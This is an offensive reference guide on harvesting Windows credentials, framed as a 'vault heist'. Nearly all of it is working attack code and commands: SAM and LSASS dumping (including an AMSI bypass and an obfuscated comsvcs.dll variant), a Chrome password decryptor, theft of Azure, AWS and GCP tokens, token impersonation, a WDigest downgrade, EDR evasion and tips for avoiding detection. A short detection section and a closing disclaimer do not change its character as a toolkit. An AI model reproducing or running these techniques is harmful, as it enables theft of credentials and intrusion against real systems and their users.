# Windows Credential Harvesting Reference

## ELI5: The Digital Vault Heist

### The Bank Vault Analogy

Imagine Windows as a massive bank with multiple vaults:

**The Main Vaults:**
- **SAM Vault** = Where Windows keeps password hashes (like keeping gold bars)
- **LSASS Vault** = Where active passwords live in memory (like cash in the teller drawer)
- **Credential Manager** = Safety deposit boxes for saved passwords
- **Registry Vaults** = Hidden safes throughout the building
- **Browser Vaults** = Personal lockboxes for web passwords

**Our Heist Plan:**
1. 🔍 **Case the joint** - Find where credentials are stored
2. 🔓 **Pick the locks** - Extract credentials from storage
3. 💰 **Grab the loot** - Harvest the credentials
4. 🏃 **Clean escape** - Avoid detection
5. 🔑 **Use the keys** - Leverage credentials for access

### Why Credentials Are Everywhere in Windows

**The Password Paradox:**
```
Users want: "Remember my password forever!"
Windows: "OK, I'll store it in 47 different places"
Attackers: "Thanks for the buffet!"
```

**Windows Stores Credentials Because:**
- **Single Sign-On** - Log in once, access everything
- **Service Accounts** - Services need passwords to run
- **Network Authentication** - Accessing shares without re-entering passwords
- **Application Integration** - Apps need to authenticate as you
- **User Convenience** - "Save my password" checkboxes

### The Credential Food Chain

```
Plain Text Password (Yum!)
        ↓
NTLM Hash (Still Delicious)
        ↓
Net-NTLMv2 (Pretty Tasty)
        ↓
Kerberos Ticket (Nutritious)
        ↓
Access Token (Snack)
```

**Why We Love Each Type:**
- **Plain Text**: Use anywhere, anytime
- **NTLM Hash**: Pass-the-Hash attacks
- **Net-NTLMv2**: Crack offline or relay
- **Kerberos Ticket**: Pass-the-Ticket attacks
- **Access Token**: Token impersonation

## SAM Database Deep Dive

### Understanding SAM Structure

The Security Account Manager (SAM) is Windows' local user database. Think of it as the master list of everyone who has a key to the building.

**SAM Location and Protection:**
```
C:\Windows\System32\config\SAM     - The database file
C:\Windows\System32\config\SYSTEM  - Contains the encryption key

Protected by:
- SYSTEM process exclusive lock (can't copy while Windows runs)
- Encrypted with SYSKEY (boot key)
- Access restricted to SYSTEM account
```

### Offline SAM Extraction

```powershell
# Method 1: Registry Save (Requires Admin)
reg save HKLM\SAM sam.save
reg save HKLM\SYSTEM system.save

# Method 2: Volume Shadow Copy
# Create shadow copy
vssadmin create shadow /for=C:

# List shadows
vssadmin list shadows

# Copy from shadow
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SAM .\sam.copy
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM .\system.copy

# Method 3: NTDS.dit style extraction with ntdsutil
ntdsutil "ac i ntds" "ifm" "create full c:\temp" q q

# Method 4: Direct disk access (offline)
# Boot from Linux USB and copy:
# /mnt/windows/Windows/System32/config/SAM
# /mnt/windows/Windows/System32/config/SYSTEM
```

### Online SAM Dumping

```powershell
# PowerShell SAM Dumper
function Dump-SAM {
    # Bypass AMSI first
    [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

    # Get SAM hive
    $sam = [Microsoft.Win32.Registry]::LocalMachine.OpenSubKey("SAM\SAM\Domains\Account\Users", $true)

    # Get SYSTEM hive for SYSKEY
    $system = [Microsoft.Win32.Registry]::LocalMachine.OpenSubKey("SYSTEM\CurrentControlSet\Control\Lsa", $true)

    # Extract boot key (SYSKEY)
    $bootkey = Get-BootKey -SystemHive $system

    # Decrypt SAM entries
    foreach($user in $sam.GetSubKeyNames()) {
        if($user -match "^[0-9A-F]{8}$") {
            $userKey = $sam.OpenSubKey($user)
            $rid = [Convert]::ToInt32($user, 16)

            # Get V value (contains encrypted hashes)
            $v = $userKey.GetValue("V")

            # Decrypt using bootkey
            $hash = Decrypt-SAMEntry -VValue $v -BootKey $bootkey -RID $rid

            Write-Output "User RID $rid : $hash"
        }
    }
}

# Mimikatz method (most common)
# First, upload mimikatz.exe or use Invoke-Mimikatz
privilege::debug
token::elevate
lsadump::sam
```

### SAM Parsing and Hash Extraction

```python
#!/usr/bin/env python3
# SAM/SYSTEM parser
import hashlib
import binascii
from Crypto.Cipher import ARC4, DES

class SAMParser:
    """Parse and decrypt SAM database"""

    def __init__(self, sam_file, system_file):
        self.sam = open(sam_file, 'rb').read()
        self.system = open(system_file, 'rb').read()
        self.bootkey = self.get_bootkey()
        self.hashed_bootkey = self.get_hashed_bootkey()

    def get_bootkey(self):
        """Extract SYSKEY/bootkey from SYSTEM hive"""
        # Parse SYSTEM hive for LSA keys
        # Located at: SYSTEM\CurrentControlSet\Control\Lsa\{JD,Skew1,GBG,Data}

        # Simplified - would need proper hive parsing
        class_names = ['JD', 'Skew1', 'GBG', 'Data']
        bootkey = b''

        for class_name in class_names:
            # Extract class data (simplified)
            class_data = self.extract_class(class_name)
            bootkey += class_data

        # Descramble bootkey
        transforms = [8, 5, 4, 2, 11, 9, 13, 3, 0, 6, 1, 12, 14, 10, 15, 7]
        descrambled = b''
        for i in transforms:
            descrambled += bytes([bootkey[i]])

        return descrambled

    def get_hashed_bootkey(self):
        """Get hashed bootkey for SAM decryption"""
        # F value from SAM\SAM\Domains\Account
        f_value = self.get_f_value()

        # RC4 decrypt with MD5 of bootkey + constants
        md5 = hashlib.md5()
        md5.update(self.bootkey + b'\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7')
        rc4_key = md5.digest()

        cipher = ARC4.new(rc4_key)
        hashed_bootkey = cipher.decrypt(f_value[0x70:0x80])

        return hashed_bootkey

    def decrypt_hash(self, rid, encrypted_hash):
        """Decrypt a single hash"""
        # DES keys from RID
        des_keys = self.rid_to_des_keys(rid)

        # Split encrypted hash
        lm_encrypted = encrypted_hash[:16]
        nt_encrypted = encrypted_hash[16:32]

        # Decrypt with DES
        lm_hash = self.des_decrypt(lm_encrypted, des_keys[0])
        nt_hash = self.des_decrypt(nt_encrypted, des_keys[1])

        return lm_hash.hex(), nt_hash.hex()

    def dump_hashes(self):
        """Dump all hashes from SAM"""
        users = self.get_user_list()

        for user in users:
            rid = user['rid']
            v_value = user['v_value']

            # Parse V value structure
            username_offset = int.from_bytes(v_value[0x0C:0x10], 'little')
            username_length = int.from_bytes(v_value[0x10:0x14], 'little')

            username = v_value[username_offset:username_offset+username_length].decode('utf-16le')

            # Get encrypted hashes
            hash_offset = int.from_bytes(v_value[0x9C:0xA0], 'little')
            encrypted_hashes = v_value[hash_offset:hash_offset+32]

            # Decrypt
            lm_hash, nt_hash = self.decrypt_hash(rid, encrypted_hashes)

            print(f"{username}:{rid}:{lm_hash}:{nt_hash}:::")

# Usage
parser = SAMParser('sam.save', 'system.save')
parser.dump_hashes()
```

## LSASS Memory Dumping Mastery

### Understanding LSASS Architecture

**LSASS (Local Security Authority Subsystem Service)** is like the security guard's brain - it remembers everyone's passwords while they're logged in.

**What's in LSASS Memory:**
- Plain text passwords (sometimes!)
- NTLM hashes
- Kerberos tickets
- SSP credentials
- WDigest passwords (on older systems)
- Cloud credentials (Office 365, Azure)

### MiniDumpWriteDump Method

```c
#include <windows.h>
#include <dbghelp.h>
#include <tlhelp32.h>
#pragma comment(lib, "dbghelp.lib")

DWORD GetLsassPID() {
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    PROCESSENTRY32 processEntry = {sizeof(PROCESSENTRY32)};

    if (Process32First(snapshot, &processEntry)) {
        do {
            if (wcscmp(processEntry.szExeFile, L"lsass.exe") == 0) {
                CloseHandle(snapshot);
                return processEntry.th32ProcessID;
            }
        } while (Process32Next(snapshot, &processEntry));
    }

    CloseHandle(snapshot);
    return 0;
}

BOOL DumpLsass() {
    DWORD lsassPID = GetLsassPID();
    if (lsassPID == 0) return FALSE;

    // Open lsass.exe
    HANDLE hProcess = OpenProcess(
        PROCESS_VM_READ | PROCESS_QUERY_INFORMATION,
        FALSE,
        lsassPID
    );

    if (hProcess == NULL) return FALSE;

    // Create dump file
    HANDLE hFile = CreateFileW(
        L"C:\\Windows\\Temp\\debug.dmp",
        GENERIC_WRITE,
        0,
        NULL,
        CREATE_ALWAYS,
        FILE_ATTRIBUTE_NORMAL,
        NULL
    );

    if (hFile == INVALID_HANDLE_VALUE) {
        CloseHandle(hProcess);
        return FALSE;
    }

    // Dump process memory
    BOOL result = MiniDumpWriteDump(
        hProcess,
        lsassPID,
        hFile,
        MiniDumpWithFullMemory,
        NULL,
        NULL,
        NULL
    );

    CloseHandle(hFile);
    CloseHandle(hProcess);

    return result;
}
```

### ProcDump Variations

```powershell
# Standard ProcDump
procdump.exe -accepteula -ma lsass.exe lsass.dmp

# Avoid detection by using different flags
procdump.exe -accepteula -r -ma lsass.exe dump.dat

# Clone and dump
procdump.exe -accepteula -r 5 -ma lsass.exe -c dump.dat

# Use process ID instead of name
$lsassPid = (Get-Process lsass).Id
procdump.exe -accepteula -ma $lsassPid memory.bin

# Dump to alternate data stream
procdump.exe -accepteula -ma lsass.exe C:\Windows\Temp\normal.txt:hidden.dmp
```

### Comsvcs.dll Technique

```powershell
# Built-in Windows DLL for dumping
rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump <lsass_pid> C:\temp\lsass.dmp full

# PowerShell implementation
$lsass = Get-Process lsass
rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump $lsass.Id C:\temp\lsass.dmp full

# Obfuscated version
$a='Co';$b='msvcs'.ToLower();$c='.dll';$d='Mini';$e='Dump'
$dll = "C:\Windows\System32\$a$b$c"
$func = "$d$e"
$pid = (Get-Process ls*ss).Id
Start-Process rundll32.exe -ArgumentList "$dll, $func $pid C:\temp\d.dmp full"
```

### Direct Memory Reading

```csharp
using System;
using System.Runtime.InteropServices;
using System.Diagnostics;

public class DirectLsassDump
{
    [DllImport("kernel32.dll")]
    static extern IntPtr OpenProcess(int dwDesiredAccess, bool bInheritHandle, int dwProcessId);

    [DllImport("kernel32.dll")]
    static extern bool ReadProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress,
        byte[] lpBuffer, int dwSize, out int lpNumberOfBytesRead);

    [DllImport("ntdll.dll")]
    static extern int NtQueryInformationProcess(IntPtr ProcessHandle, int ProcessInformationClass,
        ref PROCESS_BASIC_INFORMATION ProcessInformation, int ProcessInformationLength, out int ReturnLength);

    public static void DumpLsassMemory()
    {
        Process lsass = Process.GetProcessesByName("lsass")[0];
        IntPtr hProcess = OpenProcess(0x1F0FFF, false, lsass.Id);

        // Get process information
        PROCESS_BASIC_INFORMATION pbi = new PROCESS_BASIC_INFORMATION();
        int returnLength;
        NtQueryInformationProcess(hProcess, 0, ref pbi, Marshal.SizeOf(pbi), out returnLength);

        // Read memory regions
        List<byte[]> memoryChunks = new List<byte[]>();
        IntPtr currentAddress = IntPtr.Zero;

        while (currentAddress.ToInt64() < 0x7FFFFFFFFFFF)
        {
            MEMORY_BASIC_INFORMATION mbi = new MEMORY_BASIC_INFORMATION();
            VirtualQueryEx(hProcess, currentAddress, ref mbi, (uint)Marshal.SizeOf(mbi));

            if (mbi.State == 0x1000 && mbi.Type == 0x20000) // MEM_COMMIT && MEM_PRIVATE
            {
                byte[] buffer = new byte[mbi.RegionSize.ToInt32()];
                int bytesRead;

                ReadProcessMemory(hProcess, mbi.BaseAddress, buffer, buffer.Length, out bytesRead);
                memoryChunks.Add(buffer);
            }

            currentAddress = new IntPtr(mbi.BaseAddress.ToInt64() + mbi.RegionSize.ToInt64());
        }

        // Save to file
        using (FileStream fs = new FileStream("lsass_memory.bin", FileMode.Create))
        {
            foreach (byte[] chunk in memoryChunks)
            {
                fs.Write(chunk, 0, chunk.Length);
            }
        }
    }
}
```

### EDR Evasion During Dumps

```powershell
# Method 1: Process Forking
function Dump-LsassFork {
    # Create process snapshot
    $snapshot = [PSObject].Assembly.GetType('System.Diagnostics.Process').GetMethod('Start').Invoke($null,
        @('powershell.exe', '-Command "sleep 1"'))

    # Duplicate lsass handle
    $lsass = Get-Process lsass
    $duplicateHandle = [IntPtr]::Zero

    [Win32]::DuplicateHandle(
        $lsass.Handle,
        $lsass.Handle,
        [System.Diagnostics.Process]::GetCurrentProcess().Handle,
        [ref]$duplicateHandle,
        0x1F0FFF,
        $false,
        2
    )

    # Dump through duplicate
    [Win32]::MiniDumpWriteDump($duplicateHandle, $lsass.Id, $fileHandle, 2, 0, 0, 0)
}

# Method 2: Silent Process Exit
function Dump-LsassSilentExit {
    # Register silent process exit handler
    New-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\lsass.exe" `
        -Name "GlobalFlag" -Value 0x200 -PropertyType DWORD -Force

    New-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\lsass.exe" `
        -Name "DumpType" -Value 0x2 -PropertyType DWORD -Force

    New-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\lsass.exe" `
        -Name "LocalDumpFolder" -Value "C:\temp" -PropertyType String -Force
}

# Method 3: WerFault.exe Abuse
function Dump-LsassWerFault {
    # Create fake crash for lsass
    $lsassPid = (Get-Process lsass).Id

    # Trigger WerFault
    & "C:\Windows\System32\WerFault.exe" -u -p $lsassPid -s 1

    # Dump will be in:
    # C:\ProgramData\Microsoft\Windows\WER\ReportQueue\
}
```

## Credential Storage Locations

### Windows Credential Manager

```powershell
# Enumerate Credential Manager
function Get-StoredCredentials {
    [void][Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime]
    $vault = New-Object Windows.Security.Credentials.PasswordVault

    try {
        $credentials = $vault.RetrieveAll()

        foreach($cred in $credentials) {
            $cred.RetrievePassword()
            [PSCustomObject]@{
                Resource = $cred.Resource
                Username = $cred.UserName
                Password = $cred.Password
            }
        }
    } catch { }
}

# Command line enumeration
cmdkey /list

# Dump with built-in tools
rundll32.exe keymgr.dll,KRShowKeyMgr

# Vault directories
dir C:\Users\%USERNAME%\AppData\Local\Microsoft\Vault\
dir C:\ProgramData\Microsoft\Vault\
dir C:\Windows\System32\config\systemprofile\AppData\Local\Microsoft\Vault\
```

### Browser Credential Extraction

```python
#!/usr/bin/env python3
import os
import json
import base64
import sqlite3
import win32crypt
from Crypto.Cipher import AES

class BrowserCredentials:
    """Extract saved passwords from browsers"""

    def get_chrome_passwords(self):
        """Extract Chrome saved passwords"""
        # Chrome password database
        db_path = os.path.join(
            os.environ['USERPROFILE'],
            r'AppData\Local\Google\Chrome\User Data\Default\Login Data'
        )

        # Copy database (it's locked)
        import shutil
        temp_db = 'chrome_login.db'
        shutil.copy2(db_path, temp_db)

        # Get encryption key
        key = self.get_chrome_key()

        # Query database
        conn = sqlite3.connect(temp_db)
        cursor = conn.cursor()
        cursor.execute('SELECT origin_url, username_value, password_value FROM logins')

        credentials = []
        for url, username, encrypted_password in cursor.fetchall():
            # Decrypt password
            if encrypted_password[:3] == b'v10':
                # AES decryption (Chrome 80+)
                nonce = encrypted_password[3:15]
                ciphertext = encrypted_password[15:-16]
                tag = encrypted_password[-16:]

                cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
                password = cipher.decrypt_and_verify(ciphertext, tag).decode()
            else:
                # DPAPI decryption (older Chrome)
                password = win32crypt.CryptUnprotectData(encrypted_password)[1].decode()

            credentials.append({
                'url': url,
                'username': username,
                'password': password
            })

        conn.close()
        os.remove(temp_db)

        return credentials

    def get_chrome_key(self):
        """Get Chrome's encryption key"""
        # Local State file contains encrypted key
        local_state_path = os.path.join(
            os.environ['USERPROFILE'],
            r'AppData\Local\Google\Chrome\User Data\Local State'
        )

        with open(local_state_path, 'r') as f:
            local_state = json.load(f)

        # Base64 decode and remove DPAPI prefix
        encrypted_key = base64.b64decode(local_state['os_crypt']['encrypted_key'])[5:]

        # Decrypt with DPAPI
        key = win32crypt.CryptUnprotectData(encrypted_key)[1]

        return key

    def get_firefox_passwords(self):
        """Extract Firefox saved passwords"""
        # Firefox profile directory
        profile_path = os.path.join(
            os.environ['APPDATA'],
            r'Mozilla\Firefox\Profiles'
        )

        # Find default profile
        profiles = [p for p in os.listdir(profile_path) if '.default' in p]
        if not profiles:
            return []

        profile = os.path.join(profile_path, profiles[0])

        # Decrypt logins.json
        import json
        logins_file = os.path.join(profile, 'logins.json')

        with open(logins_file, 'r') as f:
            logins = json.load(f)

        # Would need NSS library to decrypt
        # This is simplified example
        return logins['logins']
```

### Registry Credential Mining

```powershell
# Common registry locations with credentials

# AutoLogon credentials
Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" |
    Select-Object DefaultUserName, DefaultPassword, DefaultDomainName

# VNC passwords
Get-ItemProperty "HKCU:\Software\ORL\WinVNC3\Password"
Get-ItemProperty "HKLM:\SOFTWARE\RealVNC\WinVNC4" -Name password

# SNMP community strings
Get-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Services\SNMP\Parameters\ValidCommunities"

# Putty sessions
Get-ChildItem "HKCU:\Software\SimonTatham\PuTTY\Sessions" | ForEach-Object {
    $session = $_.PSChildName
    $hostname = (Get-ItemProperty $_.PSPath).HostName
    $username = (Get-ItemProperty $_.PSPath).UserName
    Write-Output "$session : $username@$hostname"
}

# RunAs credentials
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\
reg query HKCU\Software\Policies\Microsoft\Windows\System\

# Unattended install passwords
$unattendPaths = @(
    "C:\unattend.xml",
    "C:\Windows\Panther\Unattend.xml",
    "C:\Windows\Panther\Unattend\Unattend.xml",
    "C:\Windows\system32\sysprep.inf",
    "C:\Windows\system32\sysprep\sysprep.xml"
)

foreach($path in $unattendPaths) {
    if(Test-Path $path) {
        Select-String -Path $path -Pattern "Password|AdminPassword|UserPassword" -Context 2
    }
}
```

### Cloud Credential Harvesting

```powershell
# Azure/Office 365 credentials
function Get-AzureTokens {
    # Azure PowerShell tokens
    $azureProfile = "$env:USERPROFILE\.Azure\AzureRmContext.json"
    if(Test-Path $azureProfile) {
        $context = Get-Content $azureProfile | ConvertFrom-Json
        $context.Contexts | ForEach-Object {
            [PSCustomObject]@{
                Account = $_.Account.Id
                TenantId = $_.Tenant.Id
                AccessToken = $_.AccessToken
            }
        }
    }

    # Azure CLI tokens
    $azCliTokens = "$env:USERPROFILE\.azure\accessTokens.json"
    if(Test-Path $azCliTokens) {
        Get-Content $azCliTokens | ConvertFrom-Json
    }
}

# AWS credentials
function Get-AWSCredentials {
    $awsFiles = @(
        "$env:USERPROFILE\.aws\credentials",
        "$env:USERPROFILE\.aws\config"
    )

    foreach($file in $awsFiles) {
        if(Test-Path $file) {
            Write-Output "=== $file ==="
            Get-Content $file
        }
    }

    # Environment variables
    Get-ChildItem env: | Where-Object {
        $_.Name -match "AWS_"
    }
}

# Google Cloud credentials
$gcpCreds = "$env:APPDATA\gcloud\credentials.db"
if(Test-Path $gcpCreds) {
    # SQLite database with OAuth tokens
    Copy-Item $gcpCreds .\gcp_creds.db
}
```

## Advanced Credential Techniques

### Token Impersonation

```csharp
using System;
using System.Runtime.InteropServices;
using System.Security.Principal;

public class TokenImpersonation
{
    [DllImport("advapi32.dll", SetLastError = true)]
    static extern bool OpenProcessToken(IntPtr ProcessHandle, uint DesiredAccess, out IntPtr TokenHandle);

    [DllImport("advapi32.dll", SetLastError = true)]
    static extern bool DuplicateTokenEx(IntPtr ExistingToken, uint DesiredAccess,
        IntPtr TokenAttributes, SECURITY_IMPERSONATION_LEVEL ImpersonationLevel,
        TOKEN_TYPE TokenType, out IntPtr NewToken);

    [DllImport("advapi32.dll", SetLastError = true)]
    static extern bool ImpersonateLoggedOnUser(IntPtr Token);

    public static void ImpersonateSystem()
    {
        // Find SYSTEM process (like winlogon)
        Process[] processes = Process.GetProcessesByName("winlogon");
        if (processes.Length == 0) return;

        IntPtr tokenHandle;
        OpenProcessToken(processes[0].Handle, 0x0002 | 0x0008, out tokenHandle);

        IntPtr dupToken;
        DuplicateTokenEx(tokenHandle, 0xF01FF, IntPtr.Zero,
            SECURITY_IMPERSONATION_LEVEL.SecurityImpersonation,
            TOKEN_TYPE.TokenPrimary, out dupToken);

        // Impersonate
        ImpersonateLoggedOnUser(dupToken);

        // Now running as SYSTEM
        WindowsIdentity identity = WindowsIdentity.GetCurrent();
        Console.WriteLine($"Now running as: {identity.Name}");
    }

    public static void StealToken(int targetPid)
    {
        Process target = Process.GetProcessById(targetPid);
        IntPtr tokenHandle;

        OpenProcessToken(target.Handle, 0x0002 | 0x0008, out tokenHandle);
        ImpersonateLoggedOnUser(tokenHandle);

        // Execute command as target user
        ProcessStartInfo psi = new ProcessStartInfo();
        psi.FileName = "cmd.exe";
        psi.UseShellExecute = false;
        psi.CreateNoWindow = true;

        Process.Start(psi);
    }
}
```

### WDigest Downgrade Attack

```powershell
# Force WDigest to store cleartext passwords (requires reboot)
function Enable-WDigest {
    # Windows 8.1/2012 R2 and later disable WDigest by default
    # Re-enable it to get cleartext passwords in memory

    Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest" `
        -Name "UseLogonCredential" -Value 1 -Type DWORD

    Write-Host "WDigest enabled. Users will need to log off/on for passwords to appear in memory."
}

# Check current WDigest status
function Get-WDigestStatus {
    $wdigest = Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest" `
        -Name "UseLogonCredential" -ErrorAction SilentlyContinue

    if($wdigest.UseLogonCredential -eq 1) {
        "WDigest is ENABLED - Cleartext passwords in memory!"
    } else {
        "WDigest is DISABLED - No cleartext passwords"
    }
}

# Lock screen trick to capture passwords
function Invoke-LockScreenCapture {
    # Force lock screen
    rundll32.exe user32.dll,LockWorkStation

    # Wait for unlock (user enters password)
    Start-Sleep -Seconds 5

    # Dump LSASS now - password will be in memory
    Dump-Lsass
}
```

### Memory-Only Credential Extraction

```powershell
# Extract credentials without touching disk
function Get-MemoryCredentials {
    # Use PowerShell reflection to avoid writing to disk
    $code = @"
    using System;
    using System.Runtime.InteropServices;
    using System.Security;

    public class MemCredentials {
        [DllImport("advapi32.dll", SetLastError = true)]
        public static extern bool CredEnumerate(string filter, int flag,
            out int count, out IntPtr pCredentials);

        public static void DumpCreds() {
            int count;
            IntPtr pCredentials;

            CredEnumerate(null, 0, out count, out pCredentials);

            // Process credentials in memory only
            for(int i = 0; i < count; i++) {
                IntPtr credential = Marshal.ReadIntPtr(pCredentials, i * IntPtr.Size);
                // Extract username/password from structure
            }
        }
    }
"@

    Add-Type -TypeDefinition $code
    [MemCredentials]::DumpCreds()
}

# Extract from specific process memory
function Get-ProcessCredentials {
    param($ProcessName)

    $process = Get-Process $ProcessName -ErrorAction SilentlyContinue
    if(!$process) { return }

    # Read process memory
    $handle = [Kernel32]::OpenProcess(0x1F0FFF, $false, $process.Id)

    # Search for credential patterns
    $patterns = @(
        [System.Text.Encoding]::Unicode.GetBytes("password"),
        [System.Text.Encoding]::Unicode.GetBytes("pwd"),
        [System.Text.Encoding]::ASCII.GetBytes("Authorization: Basic")
    )

    # Scan memory regions
    $memInfo = New-Object MEMORY_BASIC_INFORMATION
    $address = 0

    while($address -lt 0x7FFFFFFF) {
        [Kernel32]::VirtualQueryEx($handle, $address, [ref]$memInfo, [Marshal]::SizeOf($memInfo))

        if($memInfo.State -eq 0x1000) { # MEM_COMMIT
            $buffer = New-Object byte[] $memInfo.RegionSize
            $bytesRead = 0

            [Kernel32]::ReadProcessMemory($handle, $memInfo.BaseAddress, $buffer,
                $buffer.Length, [ref]$bytesRead)

            # Search for patterns
            foreach($pattern in $patterns) {
                $index = [Array]::IndexOf($buffer, $pattern[0])
                if($index -ne -1) {
                    # Found potential credential
                    $credential = [System.Text.Encoding]::Unicode.GetString(
                        $buffer, $index, [Math]::Min(256, $buffer.Length - $index)
                    )
                    Write-Output "Found: $credential"
                }
            }
        }

        $address = $memInfo.BaseAddress + $memInfo.RegionSize
    }
}
```

## Detection and OPSEC

### Blue Team Indicators

**SAM Access Detection:**
```powershell
# Event Log monitoring
Get-WinEvent -FilterHashtable @{LogName='Security'; ID=4656,4663} |
    Where-Object {$_.Message -match "SAM|SECURITY|SYSTEM"}

# File access monitoring
Get-WinEvent -FilterHashtable @{LogName='Security'; ID=4663} |
    Where-Object {$_.Message -match "config\\SAM|config\\SYSTEM"}
```

**LSASS Access Detection:**
```powershell
# Sysmon Event ID 10 - Process Access
Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-Sysmon/Operational'; ID=10} |
    Where-Object {$_.Message -match "lsass.exe"}

# Look for suspicious process accessing LSASS
Get-WinEvent -FilterHashtable @{LogName='Security'; ID=4656} |
    Where-Object {$_.Message -match "lsass.exe" -and $_.Message -match "PROCESS_VM_READ"}
```

### Red Team OPSEC

**Minimize Detection:**
```powershell
# 1. Use living-off-the-land binaries
# Instead of: mimikatz.exe
# Use: rundll32.exe comsvcs.dll

# 2. Avoid common paths
# Instead of: C:\temp\lsass.dmp
# Use: C:\ProgramData\Microsoft\Search\Data\Applications\Windows\gather.dat

# 3. Obfuscate process names
# Instead of: procdump.exe
# Rename to: vmtoolsd.exe

# 4. Time your attacks
# Dump during high activity periods
$hour = (Get-Date).Hour
if($hour -lt 9 -or $hour -gt 17) {
    Write-Host "Waiting for business hours..."
    return
}

# 5. Clean up immediately
$dumpFile = "C:\Windows\Temp\debug.bin"
Dump-Lsass -Output $dumpFile
$bytes = [System.IO.File]::ReadAllBytes($dumpFile)
[System.IO.File]::Delete($dumpFile)
# Process bytes in memory
```

## Common Pitfalls and Solutions

### Pitfall 1: "Access Denied on LSASS"

**Problem:** Can't open LSASS even as admin
**Solution:** Enable SeDebugPrivilege first
```powershell
# Enable debug privilege
$definition = @'
using System;
using System.Runtime.InteropServices;

public class Privs {
    [DllImport("advapi32.dll", SetLastError=true)]
    public static extern bool AdjustTokenPrivileges(IntPtr TokenHandle, bool DisableAllPrivileges,
        ref TOKEN_PRIVILEGES NewState, int BufferLength, IntPtr PreviousState, IntPtr ReturnLength);

    public static void EnableDebug() {
        // Implementation
    }
}
'@
Add-Type $definition
[Privs]::EnableDebug()
```

### Pitfall 2: "Credential Guard Enabled"

**Problem:** Credential Guard isolates LSASS
**Solution:** Use token manipulation instead
```powershell
# Can't dump LSASS? Steal tokens instead
Get-Process | Where-Object {$_.SI -eq 1} | ForEach-Object {
    # Duplicate token
    Invoke-TokenManipulation -DuplicateToken -ProcessId $_.Id
}
```

### Pitfall 3: "EDR Blocking Mimikatz"

**Problem:** EDR detects and blocks Mimikatz
**Solution:** Use alternatives or custom implementations
```powershell
# Alternative tools
# - SafetyKatz (modified Mimikatz)
# - SharpKatz (C# port)
# - Dumpert (direct syscalls)
# - NanoDump (beacon object file)
# - MiniDumpWriteDump variations
```

## Lab Exercises

1. **SAM Extraction Challenge**: Extract SAM without touching disk
2. **LSASS Dump Race**: Dump LSASS before EDR reacts
3. **Token Hunter**: Find and impersonate all unique tokens
4. **Browser Harvest**: Extract passwords from 3 browsers
5. **Cloud Credential Hunt**: Find Azure/AWS/GCP credentials

## Conclusion

Windows credential harvesting is like a treasure hunt where X marks every spot. The OS needs credentials everywhere to function, creating a rich hunting ground for attackers. Key principles:

1. **Credentials are everywhere** - SAM, LSASS, registry, files, memory
2. **Multiple extraction methods** - Always have backup techniques
3. **OPSEC is critical** - Detection = game over
4. **Leverage what's there** - Living-off-the-land wins
5. **Think beyond passwords** - Tokens, tickets, and hashes work too

Remember: With great access comes great responsibility. These techniques should only be used for authorized security testing.

## Quick Reference Card

```powershell
# SAM Dump
reg save HKLM\SAM sam.save
reg save HKLM\SYSTEM system.save

# LSASS Dump
rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump <PID> dump.bin full

# Credential Manager
cmdkey /list
rundll32.exe keymgr.dll,KRShowKeyMgr

# Token Impersonation
Invoke-TokenManipulation -Enumerate
Invoke-TokenManipulation -ImpersonateUser -Username "SYSTEM"

# Quick wins
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
dir C:\Users\*\AppData\Local\Microsoft\Credentials\
findstr /si password *.xml *.txt *.config
```